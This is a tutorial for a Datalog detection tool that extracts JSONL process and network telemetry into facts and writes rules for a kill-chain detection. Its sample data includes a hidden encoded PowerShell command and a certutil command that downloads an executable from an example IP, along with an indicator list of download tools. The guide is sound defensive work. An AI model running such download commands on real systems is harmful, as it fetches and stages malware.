# User Guide: From JSONL to Detections

This guide walks through building a small detection pipeline from scratch:
loading raw JSONL telemetry into Datalog facts, deriving conclusions with
rules, and writing findings back out as JSONL. It is a narrative
companion to two reference manuals, which describe each layer completely:

- the [Datalog Language Reference](reference/datalog.md) — syntax, types,
  builtins, and evaluation semantics;
- the [JSON Fact Extraction Reference](reference/jsonfacts.md) — schema
  files, mappings, matchers, and the encoder.

The [mordor example](../examples/mordor/README.md) applies everything
here to real Windows security telemetry and is a good follow-up.

## The shape of the system

There are two layers, and they meet at the fact database:

1. **Extraction** (the `jsonfacts` schema) turns JSONL records into
   *facts* — tuples like `process(1234, "powershell.exe", "powershell
   -enc JAB...")`. Everything about "what the data looks like" lives
   here: which files, which fields, which pattern tables.
2. **Rules** (Datalog) derive new facts from existing ones — joins,
   recursion, negation, aggregation. Everything about "what the data
   means" lives here.

Keeping the layers separate pays off quickly: schemas change when the
telemetry format changes; rules change when the detection logic changes.

## Some data

Suppose `data/proc_events.jsonl` holds process-creation events, one JSON
object per line:

```json
{"event": "process", "pid": 4211, "ppid": 812, "image": "powershell.exe", "cmdline": "powershell -nop -w hidden -enc JABzAD0A...", "host": "ws01"}
{"event": "process", "pid": 4230, "ppid": 4211, "image": "certutil.exe", "cmdline": "certutil -urlcache -split -f http://203.0.113.9/a.exe", "host": "ws01"}
{"event": "network", "pid": 4230, "dst_ip": "203.0.113.9", "dst_port": 80, "host": "ws01"}
```

Note the file mixes event types — real telemetry usually does.

## Step 1: a schema that extracts facts

A schema maps files to predicates. Save this as `schema.yaml`:

```yaml
sources:
  - file: proc_events.jsonl
    mappings:
      - predicate: process
        args: ["value.host", "value.pid", "value.ppid", "value.image", "value.cmdline"]
        filter: "value.event == 'process'"
      - predicate: net_conn
        args: ["value.host", "value.pid", "value.dst_ip", "value.dst_port"]
        filter: "value.event == 'network'"
```

Each mapping runs against every line. The `filter` selects which lines a
mapping applies to — here, splitting the heterogeneous file into two
typed predicates. `value` is the decoded JSON of the current line, and
the `value.field` expressions pick terms out of it. (Expressions are
[expr-lang](https://expr-lang.org/); the extraction reference §2 lists
exactly what they can do.)

Launch the REPL against the data:

```
$ datalog -c schema.yaml -d ./data
?> .list
  net_conn/4  (1 facts)
  process/5  (2 facts)
```

Two things are worth noticing already. First, predicates are identified
by name *and arity* — `process/5` is unrelated to any `process/3`.
Second, arithmetic types survived the trip: `value.pid` loaded as the
integer `4211`, not the string `"4211"`.

Query the facts with variables — capitalized or not, any bare identifier
is a variable in this Datalog (all ground data is written as quoted
strings or numbers):

```
?> process(Host, Pid, ?, Image, ?)?
  Host = "ws01", Pid = 4211, Image = "powershell.exe"
  Host = "ws01", Pid = 4230, Image = "certutil.exe"
  (2 results)
```

`?` is an anonymous variable — a "don't care" that matches anything and
is left out of the results.

## Step 2: name the terms

Declarations document each predicate and name its terms. Append to
`schema.yaml`:

```yaml
declarations:
  - name: process
    use: "A process creation event."
    terms:
      - {name: host}
      - {name: pid, type: integer}
      - {name: ppid, type: integer}
      - {name: image}
      - {name: cmdline}
  - name: net_conn
    use: "An outbound network connection."
    terms:
      - {name: host}
      - {name: pid, type: integer}
      - {name: dst_ip}
      - {name: dst_port, type: integer}
```

Declarations do three jobs: they document the schema (the CLI, MCP
server, and web workbench surface the `use` strings), they name output
fields when facts are encoded back to JSONL (step 6), and they enable
optional type checking of facts and rules.

## Step 3: pattern tables with matchers

Detection logic constantly asks "does this string contain any of these
patterns?" You *can* write that per rule with the string builtins
(`@contains`, `@regex_match`, …), but for lists of indicators the schema
offers something better: **matchers**, which scan loaded facts once and
materialize the matches as facts of their own.

```yaml
matchers:
  - predicate: process
    term: 4                     # cmdline (0-based)
    case_insensitive: true
    windash: true
    contains:
      - certutil
      - "-enc"
      - Invoke-WebRequest
  - predicate: net_conn
    term: 2                     # dst_ip
    cidr:
      - "203.0.113.0/24"        # known-bad range
```

Reload (`.reload`) and look:

```
?> .list
  ci_wd_contains/2  (2 facts)
  cidr_match/2  (1 facts)
  net_conn/4  (1 facts)
  process/5  (2 facts)

?> ci_wd_contains(Cmd, Pattern)?
  Cmd = "certutil -urlcache -split -f http://203.0.113.9/a.exe", Pattern = "certutil"
  Cmd = "powershell -nop -w hidden -enc JABzAD0A...", Pattern = "-enc"
  (2 results)
```

The emitted predicate name encodes the modifiers: `ci_` for
case-insensitive, `wd_` for windash (`-flag` and `/flag` treated as
equivalent — a Windows habit). Each match fact pairs the *full scanned
string* with the *pattern that hit*, so rules join on the string value.
CIDR matches land in `cidr_match(Ip, Network)`.

Matchers earn their keep as pattern lists grow: hundreds of indicators
can live in external files (`contains_from: lolbins.txt`) and are matched
once at load with a compiled prefilter, instead of per rule evaluation.
The extraction reference §3 covers all seven match kinds, including
base64 variants that find patterns inside encoded PowerShell commands.

## Step 4: rules

Now the Datalog side. Save as `rules.dl`:

```prolog
% A process is suspicious if its command line matched an indicator.
suspicious(Host, Pid, Cmd) :-
    process(Host, Pid, ?, ?, Cmd),
    ci_wd_contains(Cmd, ?).

% Parent-child edges, and their transitive closure.
child(Host, Parent, Child) :- process(Host, Child, Parent, ?, ?).

descendant(Host, A, D) :- child(Host, A, D).
descendant(Host, A, D) :- child(Host, A, M), descendant(Host, M, D).

% A suspicious process that descends from another suspicious process,
% with a connection to a known-bad network: the chain is complete.
kill_chain(Host, RootPid, Pid, Ip) :-
    suspicious(Host, RootPid, ?),
    descendant(Host, RootPid, Pid),
    suspicious(Host, Pid, ?),
    net_conn(Host, Pid, Ip, ?),
    cidr_match(Ip, ?).
```

Load it and query:

```
$ datalog -c schema.yaml -d ./data rules.dl
?> kill_chain(Host, Root, Pid, Ip)?
  Host = "ws01", Root = 4211, Pid = 4230, Ip = "203.0.113.9"
  (1 results)
```

The rules read as sentences, and each one is independently queryable —
when a detection misfires, you debug by querying the intermediate
predicates (`suspicious(H, P, C)?`, `descendant(H, A, D)?`) bottom-up.

Note what the recursion in `descendant` gives you for free: process
trees of any depth, evaluated to fixpoint by the engine. Note also the
join between the two layers — `ci_wd_contains` and `cidr_match` are
ordinary predicates as far as rules are concerned; the schema
manufactured them, but nothing marks them as special.

### Negation and aggregates

Two more tools complete the basic kit. Negation expresses "and no fact
matches":

```prolog
% Suspicious processes that did NOT come from an interactive shell.
orphan_suspicious(Host, Pid) :-
    suspicious(Host, Pid, ?),
    not child(Host, ?, Pid).
```

Aggregates summarize groups — the head variables other than the result
variable define the grouping:

```prolog
conn_count(Host, N) :- N = count : net_conn(Host, ?, ?, ?).
```

Both come with compile-time guardrails (stratification, safety checking)
described in the language reference §9 — programs that would be
ambiguous or non-terminating are rejected with an error, not evaluated
wrongly.

## Step 5: nested records — IDs and composites

Real telemetry is rarely flat. Two mechanisms handle structure, and they
compose.

**One-to-many: imperative mappings.** When one record should become
several facts — an email with N recipients, say — a mapping can be a
small program instead of an arg list:

```yaml
sources:
  - file: emails.jsonl
    mappings:
      - expr: |
          let id = fresh_id();
          assert("email", [id, value.sender, value.subject]);
          map(value.recipients, assert("email_to", [id, #]))
```

`fresh_id()` mints a synthetic ID (printed `#0`, `#1`, …) that appears in
every fact asserted for the record, so rules can join the pieces back
together. IDs are opaque join keys: they exist only to tie facts
together, and cannot be written literally in rule text.

**Whole records: composites.** A mapping argument that evaluates to a
JSON object or array loads as a single atomic *composite* term. The
recommended idiom — *flatten and retain* — asserts the hot fields flat
(for fast indexed joins) and the raw record once, under the same ID, for
provenance:

```yaml
      - expr: |
          let id = fresh_id();
          assert("event", [id, value]);
          assert("process", [id, value.pid, value.image, value.cmdline])
```

Rules destructure composites lazily with patterns:

```prolog
% Reach into the retained record only for facts that matter.
alert(Id, Cmd, Record) :-
    suspicious_id(Id),
    event(Id, Record),
    process(Id, ?, ?, Cmd).

% Patterns match inside composites: any event whose record carries
% an integrity_level field set to "System".
system_event(Id) :- event(Id, {integrity_level: "System"}).
```

Object patterns are *open* — `{integrity_level: "System"}` matches any
object with that key/value, ignoring other keys — and a missing key is
simply no match. The pattern syntax, its `@json_*` builtin underpinnings,
and its restrictions are in the language reference §6 and §8.2.

Run detections on the flat predicates and reach into composites only for
findings; destructuring every fact in a hot rule forgoes the engine's
column indexes.

## Step 6: results back out as JSONL

The pipeline ends where it began: JSONL. Declared term names become
field names. In Go:

```go
cfg.LoadSchemaDir("schemas")
db, _ := cfg.LoadDir("data")
tr, _ := syntax.Parse(seminaive.New(), rulesText)
out, _ := tr.Transform(ctx, db)

enc := jsonfacts.NewEncoder(os.Stdout, slices.Collect(out.Declarations()))
for row := range out.Facts("kill_chain", 4) {
    enc.Encode("kill_chain", row)
}
```

```json
{"kill_chain": {"host": "ws01", "ip": "203.0.113.9", "pid": 4230, "root": 4211}}
```

(Add a `kill_chain` declaration to the schema to get those field names;
otherwise terms are keyed by position.) A retained composite encodes as
its complete original JSON — so an alert can carry the full source
record as evidence without any reconstruction.

## Working style

A workflow that works well, whether the author is a person or a model:

1. **Look at raw data first.** A few JSONL lines tell you the field
   names and event discriminators.
2. **Write the smallest schema that loads something**, then check fact
   counts (`.list`). A mapping that matched nothing is usually a filter
   typo — and a filter that doesn't evaluate to true/false (e.g. a
   misspelled field) skips records, so counts are the feedback loop.
3. **Query facts interactively** before writing rules.
4. **Build rules bottom-up**, one queryable predicate per concept, and
   join them at the top. Debug by querying intermediates.
5. **Only then** wire up output encoding.

The interactive surfaces are built around exactly this loop: the REPL
(`datalog -c schema.yaml -d data rules.dl`), the web workbench (`datalog
serve`, live extraction preview and rule feedback), and the MCP server
(`datalog mcp`, the same session driven by a model). See the README for
those.

## Where to go next

- [Datalog Language Reference](reference/datalog.md) — the complete
  language: every literal form, builtin, aggregate, and compile-time
  check.
- [JSON Fact Extraction Reference](reference/jsonfacts.md) — the complete
  schema surface: every mapping form, matcher kind, and encoder rule.
- [examples/mordor](../examples/mordor/) — lateral-movement detection
  over real Windows telemetry, using most of the features above.
- [examples/finbench](../examples/finbench/) — cyclic ownership detection
  over a financial graph benchmark, exercising recursion at scale.
